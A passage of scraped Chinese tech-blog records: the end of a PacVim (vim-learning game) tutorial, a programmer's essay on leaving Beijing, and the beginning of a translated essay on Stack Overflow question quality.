crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pacvim 5 n\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a403c1a5829469109-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a403c1a5829469109-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a403c1a5829469109-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pacvim</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">n</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a403c1a5829469109-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这里，<code>5</code> 表示等级，<code>n</code>表示模式。有两种模式：</p>\n<ul>\n<li><code>n</code> – 普通模式。</li>\n<li><code>h</code> – 困难模式。</li>\n</ul>\n<p>默认模式是 <code>h</code>，这很难：</p>\n<p>要从头开始（<code>0</code> 级），请运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a403c1a9769487024\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pacvim\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a403c1a9769487024-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a403c1a9769487024-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a403c1a9769487024-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pacvim</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a403c1a9769487024-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>以下是我 Ubuntu 18.04 LTS 的示例输出。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/89a95a6695047749834d9662e67957f2.png\" alt=\"\"></p>\n<p>要开始游戏，只需按下回车。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/aeb1e44f7421aad3ecab3a2937083929.png\" alt=\"\"></p>\n<p>现在开始游戏。阅读下一节了解如何玩。</p>\n<p>要退出，请按下 <code>ESC</code> 或 <code>q</code>。</p>\n<p>以下命令以困难模式启动游戏第 <code>5</code> 关。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a403c1ac433203661\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pacvim 5 h\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a403c1ac433203661-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a403c1ac433203661-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a403c1ac433203661-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pacvim</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">h</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a403c1ac433203661-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>或者，</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a403c1af525510003\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ pacvim 5\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a403c1af525510003-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a403c1af525510003-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a403c1af525510003-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pacvim</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a403c1af525510003-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h4 id=\"toc_4\">如何玩 PacVim？</h4>\n<p>PacVim 的使用与 PacMan 非常相似。</p>\n<p>你必须跑过屏幕上所有的字符，同时避免鬼魂（红色字符）。</p>\n<p>PacVim有两个特殊的障碍：</p>\n<ol>\n<li>你不能移动到墙壁中（黄色）。你必须使用 vim 动作来跳过它们。</li>\n<li>如果你踩到波浪字符（青色的 <code>~</code>），你就输了！</li>\n</ol>\n<p>你有三条生命。每次打赢 0、3、6、9 关时你都会获得新生命。总共有 10 关，从 0 到 9，打赢第 9 关后，游戏重置为第 0 关，但是鬼魂速度变快。</p>\n<p><strong>获胜条件</strong></p>\n<p>使用 vim 命令将光标移动到字母上并高亮显示它们。所有字母都高亮显示后，你就会获胜并进入下一关。</p>\n<p><strong>失败条件</strong></p>\n<p>如果你碰到鬼魂（用<strong>红色 G</strong> 表示）或者<strong>波浪字符</strong>，你就会失去一条命。如果命小于 0 条，你将会输掉整个游戏。</p>\n<p>这是实现的命令列表：</p>\n<table cellpadding=\"4\">\n<thead>\n<tr>\n<th>键</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>q</td>\n<td>退出游戏</td>\n</tr>\n<tr>\n<td>h</td>\n<td>向左移动</td>\n</tr>\n<tr>\n<td>j</td>\n<td>向下移动</td>\n</tr>\n<tr>\n<td>k</td>\n<td>向上移动</td>\n</tr>\n<tr>\n<td>l</td>\n<td>向右移动</td>\n</tr>\n<tr>\n<td>w</td>\n<td>向前移动到下一个 word 开始</td>\n</tr>\n<tr>\n<td>W</td>\n<td>向前移动到下一个 WORD 开始</td>\n</tr>\n<tr>\n<td>e</td>\n<td>向前移动到下一个 word 结束</td>\n</tr>\n<tr>\n<td>E</td>\n<td>向前移动到下一个 WORD 结束</td>\n</tr>\n<tr>\n<td>b</td>\n<td>向后移动到下一个 word 开始</td>\n</tr>\n<tr>\n<td>B</td>\n<td>向后移动到下一个 WORD 开始</td>\n</tr>\n<tr>\n<td>$</td>\n<td>移动到行的末尾</td>\n</tr>\n<tr>\n<td>0</td>\n<td>移动到行的开始</td>\n</tr>\n<tr>\n<td>gg/1G</td>\n<td>移动到第一行的开始</td>\n</tr>\n<tr>\n<td>数字加 G</td>\n<td>移动到由数字给出的行的开始</td>\n</tr>\n<tr>\n<td>G</td>\n<td>移到最后一行的开头</td>\n</tr>\n<tr>\n<td>^</td>\n<td>移到当前行的第一个 word</td>\n</tr>\n<tr>\n<td>＆</td>\n<td>1337 cheatz（打赢当前关）</td>\n</tr>\n</tbody>\n</table>\n<p>玩过几关之后，你可能会注意到 vim 的使用有改善。一段时间后继续玩这个游戏，直到你掌握 Vim 的使用。</p>\n<p><strong>建议阅读：</strong></p>\n<p>今天就是这些。希望这篇文章有用。PacVim 好玩又有趣并且让你有事做。同时，你应该能够彻底学习足够的 Vim 命令。试试看，你不会感到失望。</p>\n<p>还有更多的好东西。敬请关注！</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114134\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114134votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114134\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "IT技术,Linux,Vim", "author": "Sk", "front_image_path": "full/bdfaedb6c82e2ca844b66f19b78be2b5b4ef49f1.jpg"}
{"title": "IT程序员的抉择：我要离开帝都了", "createdate": "2018/06/21", "url": "http://blog.jobbole.com/114136/", "url_object_id": "c4156eb16689abd02ccd4f571b73594d", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/03/career.jpg"], "thumbs": 1, "bookmark": null, "comments": 3, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/mazhimazhi/p/9190218.html\">做我自己的主人</a>   </div><div id=\"cnblogs_post_body\">\n<p>不知不觉在北京已经漂泊了近5年了，共为3家公司打过工，其中有几十人的小公司，也有几万人的大公司。随着工作技能的提升和工作经验的积累，薪水自然也涨了不少，但是看着北京的房价、物价飞涨，感觉自己赚多少都是小钱，还不如尽早卷铺盖回内蒙老家发展。那里毕竟是老家，亲戚朋友相对多一点。随着年龄的增长，也想有个自己的家了。</p>\n<p>之前犹犹豫豫的好长时间，不知道自己是留是走，今天还是详细的罗列了两个地方发展的坏处：</p>\n<h3>呆在北京坏处：</h3>\n<p>（1）工作压力大</p>\n<p>尤其是互联网公司，研发需求还是比较多的，有些需求还比较急，清闲的时候少。不过现在觉得还好，技术上有很大的进步，能独立扛事儿，一般的IT研发岗位还是可以得心应手的。</p>\n<p>（2）房价高，落户难</p>\n<p>在北京落户，有一套自己的房子，这想都不敢想了。看着日益飙高的房价和近乎不可能满足的帝都落户条件，如果要呆在北京发展，那注定一辈子只能租房了，像我的同学一样，在偏远一点的地方租个小两居，再买个<br>\n15万以下的车代步，总感觉这不是我想要的生活。</p>\n<p>（3）空气差，雾霾严重</p>\n<p>每天吸雾霾，我都不知道的少活多少年了。随着年龄的增长，感觉身体才最重要，尤其是看到认识的人得了重病后更感觉身体的宝贵。如果继续呆在帝都的话，那也只能是天天吸了。</p>\n<p>（4）漂泊孤独感</p>\n<p>没亲戚，只有几个在大学交好的同学，不过现在也都各忙各的，聚的少，大部分时间还是自己一个人。工作这么多年，也少有能交心的同事。一直感觉自己的生活过的并不快乐，也许有个人陪伴会好很多吧。</p>\n<p>（5）离父母太远</p>\n<p>父母已经上年纪了，而且也不希望离他们太远，万一有个病痛啥的，照顾实在不方便。</p>\n<h3>呆在内蒙坏处：</h3>\n<p>（1）知名IT企业少，岗位技术含量低</p>\n<p>去年中旬专门休了年假回内蒙面试了几家IT公司，挑来挑去还是选择回京继续工作。主要是外包的多，充其量也就给企业做定制化软件，有的还要求驻场开发，几乎没有做自家产品的。这种性质的岗位貌<br>\n似也不轻松。</p>\n<p>（2）薪水低</p>\n<p>薪水和帝都比起来，都不能用腰斩来形容了，要1万都觉得太多，这个心理落差的承受，而且内蒙还不是强制单位上五险一金，所以只有2家公司有五险一金，而且按最低额度缴纳。如果没有房贷，车贷，这个薪水也不是不能接受。这些年在北京也赚了一点钱，再找父母凑点，房子还是能勉强买的起的。</p>\n<p>（3）容易不满足现状，不甘心</p>\n<p>如果岗位技术含量低，而且活儿还多的话，肯定干不长久。而且本人很喜欢技术，很爱在技术上玩儿点高端的。哎，实在不行就自个儿干吧，写写技术书，录录网络课程啥的，相对来说即能选择性学习一些<br>\n感兴趣的技术，又不至于饿死吧。</p>\n<p>（4）空气干燥，对某些植物过敏，容易引发过敏性鼻炎</p>\n<p>内蒙是没有雾霾，但是有沙尘暴，而且为了绿化植被，防止沙漠化，种了一些叫不上名的植物，我很过敏。</p>\n<p>（5）回去容易出来难</p>\n<p>我30出头的年龄，回去肯定要成家的，有家了出来可就难了。</p>\n<p>反正选择在哪个地方发展坏处都不少。但是这么多年在北京奋斗，我感觉除了看上北京的工作机会，就再也没有让我留恋的东西了。我要辞职了，我要离开北京了，再见！2018.6.16</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114136\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114136votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114136\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "职场,职业生涯", "author": "做我自己的主人", "front_image_path": "full/18fc86594a34c2bebbefd765480669feb0504c69.jpg"}
{"title": "如何成为 StackOverflow 上合格的提问者与回答者", "createdate": "2018/07/09", "url": "http://blog.jobbole.com/114166/", "url_object_id": "3c54b89b3dd03db77b3745813da08bcc", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/03/6dd085bf97f82f786b71b4fbcdb37e88.jpg"], "thumbs": 1, "bookmark": null, "comments": null, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/wx232824506\">学以致用123</a> 翻译，<a href=\"http://www.jobbole.com/members/liuchang\">刘唱</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://codeblog.jonskeet.uk/2018/03/17/stack-overflow-culture/\">JONSKEET</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>写这篇文章最直接的原因是我的朋友 Rob Conery 发了一条<a href=\"https://twitter.com/robconery/status/974678531832610816\">推特</a>，解释他为什么放弃在 Stack Overflow 贡献答案。</p>\n<p>然而，那已经是很长时间的事了。前不久，我开始写一篇与本文类似的文章，但是文章越写越长，并且没有得出任何结论。现在我用一个小时的时间写这篇文章，然后不论写了什么都要发出去（稍后可能会重新排版）。</p>\n<p>我了解很多用户对 Stack Overflow 的复杂感情。有些人认为它完全没有价值，但是我相信更多的人认为它“资源有价值，但是潜在的反对意见让人很难做出贡献”。有些人则定期做出贡献，在合理的时间范围内，偶尔解释或者查看反对意见。</p>\n<p>这篇文章，我将谈谈我的经历，和我的一些看法，关于 Stack Overflow 存在的问题、我对一些察觉到的问题持反对态度、和如何改善目前的状况。下面是我希望在二月份拜访 Stack Overflow 团队时详细讨论的主题，但我们却忙于<a href=\"https://stackoverflow.blog/2018/03/14/podcast-123-jon-skeet-wants-you-to-be-a-feminist/\">讨论其它重要问题</a>。</p>\n<p>在这篇文章中，我大部分讨论的是”提问者” 和 “回答者”，这是特意进行的简化。许多用户可能既是求助者又是回答者，我很多时候还会用不写答案但是用“view” 写评论的方式成为回答者。尽管任何用户都可以担任不同的角色，但是对提交的每个问题，每个人通常只有一个角色。当然还有其他的角色，例如“评论其它答案的评论者”，我不想花费过多的时间讨论这个问题。</p>\n<h3>目标和期望的差距</h3>\n<p>与生活中大多数事情相似，当所有人目标一致时 Stack Overflow 的表现最好，因为我们可以共同迈向那个目标。相反，当人们的目标不同时则通常会出现问题。</p>\n<p>对于 Stack Overflow 而言，最普遍的问题在于这两个目标的差异：</p>\n<ul>\n<li>– 提问者：尽量减少解决面临的问题所需要的时间</li>\n<li>– 回答者：最大限度地提高网站所有问题的价值，将网站视为长久的资源</li>\n</ul>\n<p>就我而言，我经常有一个“试图帮助提高软件工程师的诊断能力，使他们能够更好地解决自己的问题”的子目标。</p>\n<p>例如，考虑这个问题（编造的，但并不牵强） ：</p>\n<blockquote><p>Random 总是返回相同的数值，它出问题了吗？</p></blockquote>\n<p>在我看来这是一个低质量的问题（稍后我将对其进行详细讨论）。我基本知道哪里存在问题，但是为了达到我的目标我希望提问者改善这个问题，我希望看到他们的代码、结果等。如果我的答案是正确的（快速连续创建多个使用相同的基于系统时间的种子的 System.Random 的多个实例），那么这个问题很可能由于重复而被关闭，并且很可能被删除。以现在的形式，这个问题对网站没有任何好处。我不想没有确定是否重复之前就将这个问题以重复的原因关闭。</p>\n<p>现在，从提问者的角度来看，这些并不重要。如果他们知道我知道问题可能出现在哪，他们可能会认为我应该告诉他们，以便他们可以继续工作。如果现在就可以得到答案，为什么还需要花费 10 分钟来重现问题？更糟糕的是，如果他们花时间做了这些事情，然后由于重复的原因又立刻关闭这个问题，这样看上去很像在浪费时间。</p>\n<p>如果忽略情绪，我认为时间没有被浪费：</p>\n<ul>\n<li>– 提问者可以了解到，提出一个清晰的问题可以更快的得到答案。</li>\n<li>– 提问者可以了解到，搜索重复问题很有价值，因为这可能意味着根本不需要提出这个问题。</li>\n</ul>\n<p>但是我们都是普通人，忽略感情显然是个不可取的方法。在这种情况下可能发生的情况是 ( 即使我始终很有礼貌) 提问者会认为 Stack Overflow 中到处是只关心自己权利的“交警”。 我当然可以认为这是不公平的（虽然这可能会突出我的实际目标 ） 但这可能无法改变任何人的想法。</p>\n<p>因此，这是个问题。Stack Overflow 社区认同网站的目标，那么在用户提出问题时向用户明确说明网站的目标了吗？ 值得注意的是<a href=\"https://stackoverflow.com/tour\">导航页面</a>(奇怪的是网站首页没有设置该链接) 包含以下内容：</p>\n<blockquote><p>在您的帮助下，我们正在共同努力，为每个关于编程的问题建立一个详细答案库。</p></blockquote>\n<p>我倾向于稍作更改：</p>\n<blockquote><p>Stack Overflow 的目标在于创建高质量的问题库以及问题的高质量答案库。</p></blockquote>\n<p>这真的是一个共同愿景吗？如果提问者意识到这点，会有帮助吗？我是希望如此，但是我怀疑它会阻止掉所有问题（我不认为有什么能做到阻止所有问题的提问，世界不是一个完美的地方）。</p>\n<p>让我们转到另一个我与其他人有不同意见的话题：低质量问题。</p>\n<h3>是的，存在低质量问题</h3>\n<p>即使不能以完全客观的方式衡量，我也敢肯定有高质量问题和低质量问题（还有很多介于中间的）。</p>\n<p>我认为 Stack Overflow 中这样的问题可以看做高质量问题：</p>\n<ul>\n<li>– 提出一个问题，并且明确知道该问题的要求。这个问题应该能够非常明显地看出答案是否回答了问题（这与答案是否正确无关）</li>\n<li>– 避免无关紧要。这可能很困难，但是我认为这是有效工作的一部分：如果在开发 web 应用程序时遇到问题，至少应该尝试确定 web 应用程序的上下文是否与问题有关。</li>\n<li>– 对其他人尽量有帮助。这是避免不相关因素的非常重要的原因。很多用户需要将字符串解析为日期。较少人需要使用 X 框架的 Y 版本通过定制及专有网络协议与 COBOL 编写的客户端交互时将字符串解析为日期。</li>\n<li>– 阐述提问者进行过的尝试、进展以及卡住的位置。</li>\n<li>– 在适当的情况下（通常情况）包含一个证明问题的小例子。</li>\n<li>– 格式正确。不要使用整页的段落，不要使用没有格式化的代码等等。</li>\n</ul>\n<p>Stack Overflow 上有很多符合所有这些要求的问题，或符合以上大部分要求的问题。</p>\n<p>我有理由认为这样的问题比另外一些问题质量高，一些问题可能只是一个家庭作业的照片。我曾经见过这样的问题，虽然，它们并不总是那么糟糕，但是我真的不知道如果这都不能认为是一个低质量的问题，我们还能达成什么一致意见。</p>\n<p>当然，在此之间还有很多问题——但我认为接受存在低质量问题的观点非常重要，或者至少经过讨论并找出不同意见。</p>\n<h3>经验有助于写出好问题，但并非绝对必要</h3>\n<p>我看过许多文章声称 Stack Overflow 对于新用户来讲过于困难，因为，新用户很难写出一个好问题。</p>\n<p>我认为接受网站协议并愿意为之付出努力的新人，至少能提出一个合理的问题。他们可能需要花费更长的时间进行研究并写出问题，而且写出的问题可能不会像有经验的人在相同情况下写出的问题那样简单。但是我相信，整体而言，新用户能够写出质量足够好的问题。他们可能没有意识到他们需要做什么或者为什么这样做，但这是一个拥有不同解决方案的问题。而不仅仅是”提问者可能是技术新手，所以我们需要回答没有任何帮助的糟糕问题”。</p>\n<p>一个稍稍不同的问题是用户是否具有写出真正优秀问题所需的诊断技能。这是一个<a href=\"https://codeblog.jonskeet.uk/2017/08/17/diagnostics-everywhere/\">我非常重视的话题</a>，而且我真的希望有一个好的解决方案，但是我真的没有。我坚信，帮助程序员提高自己的诊断能力，除了在 Stack Overflow 中提出更好的问题之外，将对他们有巨大的好处。</p>\n<h3>一些用户在 Stack Overflow 